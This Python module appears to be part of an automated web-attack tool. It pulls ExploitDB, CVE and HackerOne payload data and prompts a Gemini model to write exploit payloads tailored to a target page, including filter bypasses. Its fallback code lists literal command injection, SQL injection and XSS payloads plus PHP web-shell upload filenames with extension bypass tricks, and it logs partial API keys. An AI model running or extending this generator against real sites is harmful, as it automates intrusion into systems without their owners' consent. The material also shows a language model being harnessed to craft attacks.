"""
Intelligent Payload Generator - Learns from ExploitDB and CVE data
NO HARDCODED LOGIC - Adapts based on real exploit knowledge
Safe to import without optional AI deps; falls back gracefully.
"""

import json
import csv
import logging
import requests
import sqlite3
from pathlib import Path
from typing import List, Dict, Any, Optional
try:
    import google.generativeai as genai  # type: ignore
except Exception:
    genai = None  # type: ignore
try:
    from .payload_index import PayloadIndex
except Exception:
    PayloadIndex = None

logger = logging.getLogger("IntelligentPayloadGenerator")

class IntelligentPayloadGenerator:
    """
    AI-powered payload generator that learns from ExploitDB and CVE databases
    Automatically generates contextual exploits without hardcoded logic
    """
    
    def __init__(self, config: Dict):
        self.config = config
        self.exploitdb_path = Path("ultimate_payloads/exploitdb_webapps.csv")
        self.cve_path = Path("ultimate_payloads/webapps_cves.txt")
        self.h1_by_cat_path = Path("ultimate_payloads/hackerone_payloads_by_category.json")
        self._h1_cache: Optional[Dict[str, List[str]]] = None
        self._pindex = PayloadIndex() if PayloadIndex else None
        
        # Initialize AI - try multiple API keys (config, then env)
        api_keys = [
            (config or {}).get('gemini_api_key'),
            (self._safe_get_env('GEMINI_API_KEY')),
        ]
        
        self.ai_model = None
        for api_key in api_keys:
            if api_key and genai is not None:
                try:
                    genai.configure(api_key=api_key)
                    self.ai_model = genai.GenerativeModel('gemini-1.5-flash')
                    logger.info(f"✅ Gemini configured with key: {api_key[:20]}...")
                    break
                except Exception as e:
                    logger.warning(f"Gemini key {api_key[:20]}... failed: {e}")
                    continue
        
        if not self.ai_model:
            if genai is not None:
                logger.warning("All Gemini API keys failed; using fallback generator")
            else:
                logger.info("Gemini SDK not installed; using fallback generator")
            
        logger.info("🧠 Intelligent Payload Generator initialized")

    def _safe_get_env(self, key: str) -> Optional[str]:
        try:
            import os
            return os.getenv(key)
        except Exception:
            return None

    def _load_h1_payloads(self) -> Dict[str, List[str]]:
        if self._h1_cache is not None:
            return self._h1_cache
        try:
            if self.h1_by_cat_path.exists():
                data = json.loads(self.h1_by_cat_path.read_text(encoding='utf-8'))
                norm = {str(k).lower(): [str(x) for x in (v or [])] for k, v in (data or {}).items()}
                self._h1_cache = norm
                return norm
        except Exception as e:
            logger.debug(f"H1 payloads load failed: {e}")
        self._h1_cache = {}
        return self._h1_cache
    
    async def generate_contextual_payloads(self, context: Dict) -> List[Dict]:
        """
        Generate intelligent payloads based on context analysis
        Uses ExploitDB knowledge + AI reasoning
        """
        logger.info(f"🎯 Generating intelligent payloads for context: {context.get('vulnerability_type', 'unknown')}")
        
        # Step 1: Analyze what we're dealing with
        vulnerability_analysis = await self._analyze_vulnerability_context(context)
        
        # Step 2: Find relevant exploits from databases
        relevant_exploits = self._find_relevant_exploits(vulnerability_analysis)
        
        # Step 3: Use AI to generate adaptive payloads
        intelligent_payloads = await self._generate_ai_payloads(context, relevant_exploits, vulnerability_analysis)
        
        logger.info(f"🚀 Generated {len(intelligent_payloads)} intelligent payloads")
        return intelligent_payloads
    
    async def _analyze_vulnerability_context(self, context: Dict) -> Dict:
        """AI analyzes the context to understand what we're dealing with"""
        if not self.ai_model:
            return self._fallback_context_analysis(context)
            
        try:
            analysis_prompt = f"""
Analyze this vulnerability context and determine the best exploitation approach:

URL: {context.get('url', 'unknown')}
HTML Content: {context.get('html_content', '')[:2000]}
Forms Found: {context.get('forms', [])}
Input Fields: {context.get('input_fields', [])}
File Uploads: {context.get('file_uploads', [])}
Technologies: {context.get('technologies', [])}

Based on this context, determine:
1. What type of vulnerability is most likely present?
2. What exploitation techniques would work?
3. What filters or protections might be in place?
4. What payload characteristics should we use?

Return a JSON object with your analysis.
"""
            
            response = self.ai_model.generate_content(analysis_prompt)
            
            try:
                # Try to extract JSON from AI response
                analysis_text = response.text.strip()
                if analysis_text.startswith('{'):
                    analysis = json.loads(analysis_text)
                else:
                    # AI didn't return JSON, parse text
                    analysis = self._parse_ai_analysis_text(analysis_text)
                    
                logger.info(f"🤖 AI vulnerability analysis complete")
                return analysis
                
            except json.JSONDecodeError:
                logger.warning("🚨 AI analysis not in JSON format, using text parsing")
                return self._parse_ai_analysis_text(response.text)
                
        except Exception as e:
            logger.warning(f"🚨 AI analysis failed: {e}")
            return self._fallback_context_analysis(context)
    
    def _find_relevant_exploits(self, analysis: Dict) -> List[Dict]:
        """Find relevant exploits from ExploitDB based on analysis"""
        relevant_exploits = []
        
        # Load ExploitDB data if available
        if self.exploitdb_path.exists():
            try:
                with open(self.exploitdb_path, 'r') as f:
                    reader = csv.DictReader(f)
                    
                    vulnerability_type = analysis.get('vulnerability_type', '').lower()
                    keywords = analysis.get('keywords', [])
                    
                    for row in reader:
                        exploit_title = row.get('title', '').lower()
                        exploit_type = row.get('type', '').lower()
                        
                        # Check if this exploit is relevant
                        if (vulnerability_type in exploit_title or 
                            vulnerability_type in exploit_type or
                            any(keyword.lower() in exploit_title for keyword in keywords)):
                            
                            relevant_exploits.append({
                                'title': row.get('title', ''),
                                'type': row.get('type', ''),
                                'platform': row.get('platform', ''),
                                'code': row.get('code', ''),
                                'relevance_score': self._calculate_relevance(row, analysis)
                            })
                            
                # Sort by relevance
                relevant_exploits.sort(key=lambda x: x['relevance_score'], reverse=True)
                logger.info(f"📚 Found {len(relevant_exploits)} relevant exploits from ExploitDB")
                
            except Exception as e:
                logger.warning(f"🚨 ExploitDB loading failed: {e}")
                
        return relevant_exploits[:10]  # Top 10 most relevant
    
    async def _generate_ai_payloads(self, context: Dict, exploits: List[Dict], analysis: Dict) -> List[Dict]:
        """Use AI to generate intelligent payloads based on exploits and context"""
        if not self.ai_model:
            return self._fallback_payload_generation(context, exploits, analysis)
            
        try:
            payload_prompt = f"""
Generate intelligent exploit payloads based on this context and exploit knowledge:

CONTEXT:
{json.dumps(context, indent=2)[:1500]}

VULNERABILITY ANALYSIS:
{json.dumps(analysis, indent=2)}

RELEVANT EXPLOITS:
{json.dumps(exploits[:5], indent=2)[:2000]}

Generate 5-10 intelligent payloads that:
1. Are specifically adapted to this target
2. Use techniques from the relevant exploits
3. Account for likely filters/protections
4. Progress from simple to advanced
5. Include bypass techniques

For each payload, provide:
- payload: The actual payload string
- technique: What technique this uses
- description: Why this payload would work
- bypass_method: What protections this bypasses

Return as JSON array of payload objects.
"""
            
            response = self.ai_model.generate_content(payload_prompt)
            
            try:
                payloads_text = response.text.strip()
                if payloads_text.startswith('['):
                    payloads = json.loads(payloads_text)
                else:
                    # Parse non-JSON response
                    payloads = self._parse_ai_payload_text(payloads_text)
                    
                logger.info(f"🤖 AI generated {len(payloads)} intelligent payloads")
                return payloads
                
            except json.JSONDecodeError:
                logger.warning("🚨 AI payload response not in JSON format")
                return self._parse_ai_payload_text(response.text)
                
        except Exception as e:
            logger.warning(f"🚨 AI payload generation failed: {e}")
            return self._fallback_payload_generation(context, exploits, analysis)
    
    def _calculate_relevance(self, exploit: Dict, analysis: Dict) -> float:
        """Calculate how relevant an exploit is to the current context"""
        score = 0.0
        
        exploit_title = exploit.get('title', '').lower()
        exploit_type = exploit.get('type', '').lower()
        
        vulnerability_type = analysis.get('vulnerability_type', '').lower()
        keywords = analysis.get('keywords', [])
        
        # Direct vulnerability type match
        if vulnerability_type in exploit_title or vulnerability_type in exploit_type:
            score += 3.0
            
        # Keyword matches
        for keyword in keywords:
            if keyword.lower() in exploit_title:
                score += 1.0
                
        # Platform matches
        platform = exploit.get('platform', '').lower()
        if 'web' in platform or 'php' in platform or 'http' in platform:
            score += 0.5
            
        return score
    
    def _fallback_context_analysis(self, context: Dict) -> Dict:
        """Basic context analysis when AI is unavailable"""
        analysis = {
            'vulnerability_type': 'web_application',
            'keywords': [],
            'likely_protections': [],
            'exploitation_approaches': []
        }
        
        html_content = context.get('html_content', '').lower()
        url = context.get('url', '').lower()
        
        # Basic analysis
        if 'type="file"' in html_content:
            analysis['vulnerability_type'] = 'file_upload'
            analysis['keywords'] = ['upload', 'file', 'bypass']
            
        elif any(cmd in html_content for cmd in ['ping', 'exec', 'system']):
            analysis['vulnerability_type'] = 'command_injection'
            analysis['keywords'] = ['command', 'injection', 'rce']
            
        elif 'input' in html_content or 'textarea' in html_content:
            analysis['vulnerability_type'] = 'xss'
            analysis['keywords'] = ['xss', 'script', 'injection']
            
        return analysis
    
    def _fallback_payload_generation(self, context: Dict, exploits: List[Dict], analysis: Dict) -> List[Dict]:
        """Generate basic payloads when AI is unavailable"""
        payloads = []
        
        vuln_type = analysis.get('vulnerability_type', 'web_application')
        
        # Generate basic payloads based on vulnerability type
        if vuln_type == 'file_upload':
            payloads = [
                {'payload': 'shell.php', 'technique': 'direct_upload', 'description': 'Direct PHP shell upload'},
                {'payload': 'shell.php.png', 'technique': 'double_extension', 'description': 'Double extension bypass'},
                {'payload': 'shell.phtml', 'technique': 'alternate_extension', 'description': 'Alternative PHP extension'},
            ]
            
        elif vuln_type == 'command_injection':
            payloads = [
                {'payload': '; id', 'technique': 'semicolon', 'description': 'Chaining via ;'},
                {'payload': '&& id', 'technique': 'and_separator', 'description': 'Chaining via &&'},
                {'payload': '| id', 'technique': 'pipe', 'description': 'Pipe into id'},
                {'payload': '|| id', 'technique': 'or_pipe', 'description': 'Fallback pipe'},
                {'payload': '`id`', 'technique': 'backticks', 'description': 'Subshell via backticks'},
                {'payload': '$(id)', 'technique': 'subshell', 'description': 'POSIX subshell'},
                {'payload': '; sleep 5', 'technique': 'time_delay', 'description': 'Time-based detection'},
            ]
        elif vuln_type == 'sql_injection' or vuln_type == 'sqli':
            payloads = [
                {'payload': "' OR '1'='1", 'technique': 'boolean', 'description': 'Classic boolean-based'},
                {'payload': "' OR 1=1--", 'technique': 'comment', 'description': 'Inline comment'},
                {'payload': "' UNION SELECT NULL--", 'technique': 'union', 'description': 'Column count probing'},
                {'payload': "' AND SLEEP(5)--", 'technique': 'time_mysql', 'description': 'Time-based MySQL'},
                {'payload': "'; WAITFOR DELAY '0:0:5'--", 'technique': 'time_mssql', 'description': 'Time-based MSSQL'},
            ]
            
        elif vuln_type == 'xss':
            payloads = [
                {'payload': '<script>alert("XSS")</script>', 'technique': 'basic_script', 'description': 'Basic script injection'},
                {'payload': '"><script>alert("XSS")</script>', 'technique': 'attribute_escape', 'description': 'HTML attribute escape'},
                {'payload': '<img src=x onerror=alert("XSS")>', 'technique': 'event_handler', 'description': 'Event handler injection'},
            ]
            
        # Merge in HackerOne-derived payloads by category (if available)
        try:
            h1 = self._load_h1_payloads()
            alias = {
                'sql_injection': 'sqli',
                'sqli': 'sqli',
                'command_injection': 'cmdi',
                'xss': 'xss',
                'file_upload': 'upload',
            }
            cat = alias.get(vuln_type.lower(), vuln_type.lower())
            extra = list(h1.get(cat) or [])
            # Also fetch from PayloadIndex if available (with no keyword filter for universality)
            try:
                if self._pindex:
                    extra += self._pindex.get(cat, limit=30)
            except Exception:
                pass
            if extra:
                seen = set()
                merged: List[Dict[str, str]] = []
                for it in payloads + [{'payload': e, 'technique': 'h1', 'description': 'HackerOne-derived'} for e in extra[:30]]:
                    p = it.get('payload')
                    if p and p not in seen:
                        seen.add(p)
                        merged.append(it)
                payloads = merged[:50]
        except Exception:
            pass

        return payloads
    
    def _parse_ai_analysis_text(self, text: str) -> Dict:
        """Parse AI analysis from text format"""
        # Basic text parsing to extract analysis
        analysis = {
            'vulnerability_type': 'web_application',
            'keywords': [],
            'likely_protections': [],
            'exploitation_approaches': []
        }
        
        text_lower = text.lower()
        
        if 'file upload' in text_lower or 'upload' in text_lower:
            analysis['vulnerability_type'] = 'file_upload'
        elif 'command injection' in text_lower or 'rce' in text_lower:
            analysis['vulnerability_type'] = 'command_injection'
        elif 'xss' in text_lower or 'cross-site' in text_lower:
            analysis['vulnerability_type'] = 'xss'
        elif 'sql injection' in text_lower or 'sqli' in text_lower:
            analysis['vulnerability_type'] = 'sql_injection'
            
        return analysis
    
    def _parse_ai_payload_text(self, text: str) -> List[Dict]:
        """Parse AI payloads from text format"""
        # Basic text parsing to extract payloads
        payloads = []
        
        # Try to find payload-like strings in the text
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if line and ('payload' in line.lower() or '<' in line or ';' in line or '|' in line):
                payloads.append({
                    'payload': line,
                    'technique': 'ai_generated',
                    'description': 'AI-generated payload',
                    'bypass_method': 'adaptive'
                })
                
        if not payloads:
            # Fallback basic payloads
            payloads = [
                {'payload': '<script>alert("XSS")</script>', 'technique': 'basic_xss', 'description': 'Basic XSS test'},
                {'payload': '; id', 'technique': 'command_injection', 'description': 'Command injection test'},
                {'payload': "' OR 1=1--", 'technique': 'sql_injection', 'description': 'SQL injection test'},
            ]
            
        return payloads[:10]  # Limit to 10 payloads
